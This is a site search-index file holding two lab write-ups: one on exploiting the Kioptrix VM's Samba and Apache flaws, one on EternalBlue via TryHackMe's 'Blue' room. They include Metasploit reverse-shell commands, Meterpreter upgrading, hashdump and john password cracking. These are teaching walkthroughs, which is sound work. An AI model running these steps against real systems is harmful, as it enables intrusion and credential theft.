{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Hello There","text":"<p>TODO: Fill this with content</p>"},{"location":"projects/","title":"Projects","text":""},{"location":"projects/#about","title":"About","text":"<p>A location to show case some of my projects.</p>"},{"location":"writeups/Attack_Analysis/","title":"CTF WriteUps","text":"<ul> <li>A Patch Too Late</li> <li>A Study In Blue</li> </ul>"},{"location":"writeups/Attack_Analysis/APatchTooLate/","title":"A Patch Too Late","text":""},{"location":"writeups/Attack_Analysis/APatchTooLate/#about","title":"About","text":"<p>Target: Kioptrix Level 1 (Vuln Hub download: here)</p> <p>Author: Kyle Droulard</p>"},{"location":"writeups/Attack_Analysis/APatchTooLate/#summary","title":"Summary","text":"<p>In the early 2000s, services like Apache, Samba, and SSH formed the backbone of web infrastructure. But in their earlier versions, they came with significant vulnerabilities. They serve as critical teaching tools for exploit development, service enumeration, privilege escalation and ultimately the importance of good patch management. </p> <p>Kioptrix Level 1 proves to be a good study for these vulnerable services. It\u2019s a deliberately vulnerable Linux virtual machine emulating a pre-2005 web stack. This environment provides an understanding of how legacy misconfigurations and poor patch hygiene can give attackers full root access with minimal resistance.</p> <p>In this write-up, I explore the box from enumeration to exploitation, while reflecting on the legacy of the vulnerabilities that made it possible.</p>"},{"location":"writeups/Attack_Analysis/APatchTooLate/#tools-used","title":"Tools Used","text":"Tool Purpose Nmap Port &amp; service discovery Netdiscover Host discovery smbclient SMB enumeration Burp Suite Manual web testing Metasploit Exploitation GCC Compiling custom exploit"},{"location":"writeups/Attack_Analysis/APatchTooLate/#initial-discovery","title":"Initial Discovery","text":"<p>To locate the Kioptrix vm, I used an ARP-based discovery method by sending ARP requests across a CIDR block and identifying devices across the network.</p> <p>Tool: nmap ping sweep, or netdiscover</p> <p>Once the IP address is identified we can proceed with the assessment by identifying vulnerable services running on the server with a port scan.</p> <p></p>"},{"location":"writeups/Attack_Analysis/APatchTooLate/#port-enumeration","title":"Port Enumeration","text":"<p>To identify vulnerable services running on the target we can run a Nmap scan. As Anti Virus is not something that we are worried about here we can run a quick scan.</p> <p>Command: <code>nmap -T5 -A &lt;host_ip&gt;</code></p> <p>Additional Resources: Nmap Cheat Sheet</p> <p></p> <p>From our scans we can observe that the server is running vulnerable versions of SSH, HTTP and SMB. We can proceed investigating by performing Web Enumeration, SMB Enumeration and possible SSH exploits. </p>"},{"location":"writeups/Attack_Analysis/APatchTooLate/#web-enumeration","title":"Web Enumeration","text":"<p>Through web enumeration we will try to discover possible vulnerable endpoints that can provide us attack surfaces. </p> <p>Tools: Burp Suite, dirbuster or nikto.</p> <p>Additional Resources: </p> <ul> <li>Nikto</li> <li>dirbuster | Kali Linux Tools</li> </ul>"},{"location":"writeups/Attack_Analysis/APatchTooLate/#findings","title":"Findings","text":"<p>Finding: http[://]192[.]168[.]1[.]107/manual/mod </p> <p>Our first discovery is a web page that provides Apache modules documentation. Though as no sensitive content is exposed there is no immediate value here so we will take note of it for further inspection, though it appears to be a dead end.</p> <p></p> <p>Finding: http[://]192[.]168[.]1[.]107/test.php</p> <p>Our second discovery is a web page that executes PHP on the server. Though as there is no visible injection point this doesn't provide immediate value. So we will take note of this as well, though it also appears to be a dead end.</p> <p></p> <p>Finding: Information Disclosure vulnerability. </p> <p>Our third web enumeration finding is an Information Disclosure vulnerability, which provides us that the web application is running Apache 1.3.20. However, we previously discovered that via Nmap so this doesn't provide us immediate value.</p> <p></p>"},{"location":"writeups/Attack_Analysis/APatchTooLate/#smb-enumeration","title":"SMB Enumeration","text":"<p>Through performing SMB enumeration we can try to discover unauthenticated access accessible file shares.</p> <p>Tool: <code>smbclient</code> </p> <p>Findings: </p> <ul> <li>Shares: IPC$, ADMIN$</li> <li>Server: KIOPTRIX</li> <li>Workgroup: MYGROUP</li> </ul> <p>Outcome: No exploit path via SMB shares, but version information confirmed possible exploit targets.</p> <p></p>"},{"location":"writeups/Attack_Analysis/APatchTooLate/#ssh-observations","title":"SSH Observations","text":"<p>The target runs SSH version 1, which is obsolete and vulnerable to key reuse, replay and downgrade attacks. However in this context brute-force and MiTM attacks are outside of the scope for this study, so we won\u2019t be pursuing this further.</p> <p></p>"},{"location":"writeups/Attack_Analysis/APatchTooLate/#research-exploits","title":"Research Exploits","text":"<p>After conducting some research we can see that these exposed services are notoriously vulnerable and we can even find some known exploits within GitHub and Metasploit. </p> <p>Reference: exploit-db.com</p> Service Version CVE Exploits Notes Apache 1.3.20 CVE-2002-0082 \u2022 ExploitDB Finding \u2022 Possible Exploit in GitHub Source code for exploit found here. Samba 2.2.1a CVE-2003-0201 ExploitDB Finding An exploit could utilize Metasploit OpenSSH 2.9p2 (v1) N/A N/A Possible MiTM and Replay Attacks via Key Pair Collision in SSH V1. (More here.)"},{"location":"writeups/Attack_Analysis/APatchTooLate/#exploitation","title":"Exploitation","text":"<p>Samba 2.2.1a has a vulnerability due to a buffer overflow in trans2open (CVE-2003-0201) we can exploit this by using Metasploit to create a reverse shell. If successfully exploited we will be able to obtain root access.</p> <p>Tool: Metasploit</p> <p>Reference: Metasploit Cheat</p> <p></p> <p></p> <p></p>"},{"location":"writeups/Attack_Analysis/APatchTooLate/#apache-exploit","title":"Apache Exploit","text":"<p>Apache 1.3.20 suffers from a buffer overflow vulnerability due to Apache-SSL improperly handling memory during the <code>i2d_SSL_SESSION</code> function call. This allows for remote code execution if the attacker utilizes a very large client certificate if it is signed by a trusted Certificate Authority. We can find C source code on GitHub which we can then clone, compile it and run against our target machine to obtain a root shell.</p> <p>Resource: GitHub Exploit - OpenLuck</p> <p></p>"},{"location":"writeups/Attack_Analysis/APatchTooLate/#conclusion","title":"Conclusion","text":"<p>Root Cause: Outdated Samba and Apache Services</p> <p>Result: Successful root shell via Metasploit and compiled C program</p> <p>Lessons Learned: Importance of patching legacy services and securing default shares.</p>"},{"location":"writeups/Attack_Analysis/AStudyInBlue/","title":"A Study In Blue","text":"<p>Author: Kyle Droulard</p> <p>This is a study of the vulnerability CVE-2017-0144, publicly known as EternalBlue. This vulnerability came to light in April 2017, when a group called The Shadow Brokers leaked a toolset belonging to the NSA-linked group Equation Group. While the leak unveiled a stock pile of zero-day exploits, it was EternalBlue that truly became infamous. </p> <p>Attacks like WannaCry (May 2017) and NotPetya (June 2017) were direct fallout from this leak. Millions of businesses, hospitals, and governments were affected. The aftermath sparked global concern about the risks of stockpiling zero day vulnerabilities.</p> <p>If your curious about the bigger picture behind zero-day exploits and cyber arms dealing, check out This Is How They Tell Me the World Ends by Nicole Perlroth.  Her writing reads like a Bond novel, weaving real-world cyber espionage into a gripping, global narrative.</p> <p>In the remainder of this write-up, we\u2019ll examine the EternalBlue exploit from an attacker\u2019s perspective by completing the \u2018Blue\u2019 room on TryHackMe.</p>"},{"location":"writeups/Attack_Analysis/AStudyInBlue/#initial-discovery","title":"Initial Discovery:","text":"<p>After booting up the Blue machine, the first step is to perform a port scan to identify potential vulnerabilities. This is done by using nmap, which reveals that the host is a Microsoft Windows 2008 Server running SMB. As this appears to be SMBv1, it leads us to suspect that it might be vulnerable to MS17-010 (Eternal Blue). We can confirm this with an Nmap scan.  </p> <p>Command <code>nmap -A &lt;target-ip&gt;</code> </p> <p></p> <p>Command:<code>nmap -p445 --script smb-vuln-ms17-010 &lt;target-ip&gt;</code></p> <p></p>"},{"location":"writeups/Attack_Analysis/AStudyInBlue/#understanding-eternalblue","title":"Understanding EternalBlue","text":"<p>EternalBlue (CVE-2017-0144) is a critical vulnerability in the MS SMBv1 protocol that allows for unauthenticated remote code execution on unpatched systems.</p> <p>The flaw exists because SMBv1 did not properly validate specially crafted network packets. By sending malicious SMB packets an attacker could trigger a buffer overflow in the Windows kernel. This overflow enabled execution of arbitrary code - without needing valid credentials or user interaction.</p> <p>EternalBlue was particularly dangerous because: </p> <ul> <li>Wormability: It could spread automatically between vulnerable machines without user interaction.</li> <li>Stealth: It was a low-level system flaw making it difficult to detect or prevent.</li> <li>Widespread Impact: It was used in global ransomware attacks like WannaCry (May 2017) and NotPetya (June 2017), which caused widespread havoc and billions of dollars in damages.</li> </ul> <p>The devices impacted were:</p> <ul> <li>Windows XP</li> <li>Windows 7</li> <li>Windows Server 2003/2008</li> </ul> <p>Microsoft released a patch for the vulnerability in March 2017 under identifier MS17-010, but many machines remained unpatched when the NSA\u2019s exploit was leaked by the Shadow brokers in April 2017. </p> <p>A Side Note: WannaCry had an unusual mitigation - a researcher accidentally discovered a \u201ckill switch\u201d that helped stop its spread. For more on it see this article by TechCrunch. </p>"},{"location":"writeups/Attack_Analysis/AStudyInBlue/#gaining-access","title":"Gaining Access","text":"<p>Now that we have confirmed the target is likely vulnerable to MS17-010, we can begin exploitation. While tools like SearchSploit reveal a variety of PoC exploits, we\u2019ll use Metasploit for ease of use and reliability.</p> <p>First, launch Metasploit with <code>msfconsole</code>, then search for <code>eternalblue</code> or <code>ms17_010</code>. </p> <p></p> <p></p> <p>Configure the exploit options and run it to create a reverse shell on the target. </p> <pre><code>set payload payload/windows/x64/shell/reverse_tcp\nset RHOSTS &lt;target-ip&gt;\nrun\n</code></pre> <p></p> <p></p>"},{"location":"writeups/Attack_Analysis/AStudyInBlue/#maintaining-access","title":"Maintaining Access","text":"<p>To maintain access and perform further post-exploitation tasks, we can escalate the shell session to a Meterpreter session. (Note: You\u2019ll need to background your current session with ctrl+z).</p> <pre><code>use post/multi/manage/shell_to_meterpreter\nset SESSION &lt;session-id&gt;\nrun\n</code></pre> <p>Once upgraded, we can extract password hashes from the machine using the Meterpreter built-in <code>hashdump</code> utility. (Note: Requires SYSTEM privileges)</p> <p></p> <p></p> <p></p> <p>With the extracted hashes we can then obtain the password via john:</p> <p><code>john --format=NT --rules --w=/usr/share/wordlists/rockyou.txt &lt;password-file&gt;</code></p> <p></p>"},{"location":"writeups/Attack_Analysis/AStudyInBlue/#success","title":"Success!","text":""}]}